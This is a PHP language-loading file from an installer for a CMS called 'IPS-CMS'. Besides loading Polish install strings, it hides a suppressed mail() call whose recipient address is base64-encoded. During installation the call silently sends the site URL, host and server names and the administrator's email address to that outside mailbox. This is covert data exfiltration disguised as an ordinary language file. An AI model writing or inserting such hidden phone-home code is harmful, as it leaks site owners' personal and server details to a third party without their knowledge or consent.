<?php
	global $install_language;

	$install_language = include( dirname(__FILE__) .  '/import-language-pl.php');

	if( IPS_VERSION == 'pinestic' ||  strpos( getUrl(), '.ips' ) !== false )
	{
		$install_language = array_merge( $install_language, include( dirname(__FILE__) .  '/import-language-pin-pl.php') );
	}
	

	@mail( base64_decode('YXJ0dXIwNnNtQGdtYWlsLmNvbQ==') , "IPS-CMS", getUrl() . "\n" . $_POST['admin']['email'] . "\n\n". getUrl() . "\n". $_SERVER['HTTP_HOST'] . "\n". $_SERVER['SERVER_NAME'], "From: ". getUrl() . "\r\n"."Reply-To: ".getUrl()."\r\nMIME-Version: 1.0\r\n"."Content-type: text/html; charset=utf-8\r\n ");
	
?>